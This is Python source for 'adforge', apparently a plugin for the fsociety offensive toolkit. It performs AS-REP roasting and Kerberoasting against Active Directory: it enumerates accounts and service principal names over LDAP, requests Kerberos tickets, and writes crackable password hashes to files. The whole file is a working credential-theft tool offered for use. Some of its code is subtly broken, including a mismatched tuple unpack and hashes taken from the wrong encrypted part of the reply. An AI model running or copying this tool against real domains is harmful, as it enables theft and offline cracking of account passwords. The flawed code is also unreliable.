from __future__ import annotations
import binascii
import datetime
import random
import sys
import subprocess
import importlib.util

from fsociety.core.base import tool
from fsociety.core.logger import Log

try:
    from impacket.krb5.asn1 import AS_REQ, AS_REP, TGS_REP
    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError
    from impacket.krb5.types import KerberosTime, Principal
    from impacket.krb5 import constants
    from pyasn1.codec.der import decoder, encoder
    import ldap3
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

@tool("adforge", "Active Directory ASREPRoast and Kerberoast", category="network")
class ADForge:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        asrep = sub.add_parser("asreproast", help="AS-REP Roast users without pre-auth")
        asrep.add_argument("domain")
        asrep.add_argument("-u", "--users", required=True, help="User list file")
        asrep.add_argument("-d", "--dc-ip", required=True)
        asrep.add_argument("-o", "--output", default="asrep_hashes.txt")

        kerb = sub.add_parser("kerberoast", help="Kerberoast SPNs for service accounts")
        kerb.add_argument("domain")
        kerb.add_argument("-u", "--user", required=True)
        kerb.add_argument("-p", "--password", default="")
        kerb.add_argument("-H", "--hash", default="")
        kerb.add_argument("-d", "--dc-ip", required=True)
        kerb.add_argument("-o", "--output", default="kerb_hashes.txt")

    @staticmethod
    def _asreproast(args, log):
        try:
            with open(args.users, "r") as f:
                users = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            log.err("User list not found.")
            return 1

        domain = args.domain.upper()
        hashes = []
        for user in users:
            try:
                req = AS_REQ()
                req["pvno"] = 5
                req["msg-type"] = 10
                req["padata"] = []
                req["req-body"]["kdc-options"] = 0x40810010
                req["req-body"]["cname"] = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                req["req-body"]["realm"] = domain
                req["req-body"]["sname"] = Principal(f"krbtgt/{domain}", type=constants.PrincipalNameType.NT_SRV_INST.value)
                till = KerberosTime.fromdatetime(datetime.datetime.now() + datetime.timedelta(hours=10))
                req["req-body"]["till"] = KerberosTime.to_asn1(till)
                req["req-body"]["rtime"] = KerberosTime.to_asn1(till)
                req["req-body"]["nonce"] = random.getrandbits(31)
                req["req-body"]["etype"] = [18, 17, 23, 3]

                resp = sendReceive(encoder.encode(req), domain, args.dc_ip)
                decoded = decoder.decode(resp, asn1Spec=AS_REP())[0]
                enc_part = decoded["enc-part"]["cipher"].asOctets()
                etype = int(decoded["enc-part"]["etype"])

                if etype == 23:
                    h = f"$krb5asrep$23${user}@{domain}:{binascii.hexlify(enc_part).decode()}"
                    hashes.append(h)
                    log.hit(f"AS-REP: {user}")
            except KerberosError:
                pass

        if hashes:
            open(args.output, "w").write("\n".join(hashes))
            log.ok(f"{len(hashes)} hash(es) -> {args.output}")
            return 0
        log.warn("No roastable users found.")
        return 1

    @staticmethod
    def _kerberoast(args, log):
        domain = args.domain.upper()
        try:
            base_dn = ",".join(f"DC={d}" for d in domain.split("."))
            conn = ldap3.Connection(f"ldap://{args.dc_ip}", user=f"{domain}\\{args.user}", password=args.password, authentication=ldap3.NTLM, auto_bind=True, receive_timeout=15)
            conn.search(base_dn, "(servicePrincipalName=*)", attributes=["sAMAccountName", "servicePrincipalName"])
            spns = []
            for entry in conn.entries:
                for spn in entry.servicePrincipalName.values:
                    spns.append((str(entry.sAMAccountName), spn))
            conn.unbind()
        except Exception as e:
            log.err(f"LDAP enumeration failed: {e}")
            return 1

        try:
            lmhash, nthash = (binascii.unhexlify(args.hash.split(":")[-1]),) if args.hash else (b"", b"")
            tgt, cipher, oldSk, sessionKey = getKerberosTGT(Principal(args.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value), args.password, domain, lmhash, nthash, args.dc_ip, requestPAC=True)
        except Exception as e:
            log.err(f"TGT request failed: {e}")
            return 1

        hashes = []
        for target_user, spn in spns:
            try:
                tgs, c2, oldSk2, sk2 = getKerberosTGS(Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value), domain, args.dc_ip, tgt, cipher, sessionKey)
                decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                enc_part = decoded["tgs-rep"]["enc-part"]["cipher"].asOctets()
                etype = int(decoded["tgs-rep"]["enc-part"]["etype"])

                if etype == 23:
                    h = f"$krb5tgs$23$*{target_user}${domain}$SPN*${binascii.hexlify(enc_part).decode()}"
                    hashes.append(h)
                    log.hit(f"TGS: {target_user} -> {spn}")
            except Exception:
                pass

        if hashes:
            open(args.output, "w").write("\n".join(hashes))
            log.ok(f"{len(hashes)} hash(es) -> {args.output}")
            return 0
        log.warn("No TGS hashes captured.")
        return 1

    @staticmethod
    def run(args, log):
        if not IMPACKET_AVAILABLE:
            log.err("Missing dependencies (impacket, ldap3, pyasn1).")
            return 1
        if args.cmd == "asreproast": return ADForge._asreproast(args, log)
        if args.cmd == "kerberoast": return ADForge._kerberoast(args, log)
        return 2
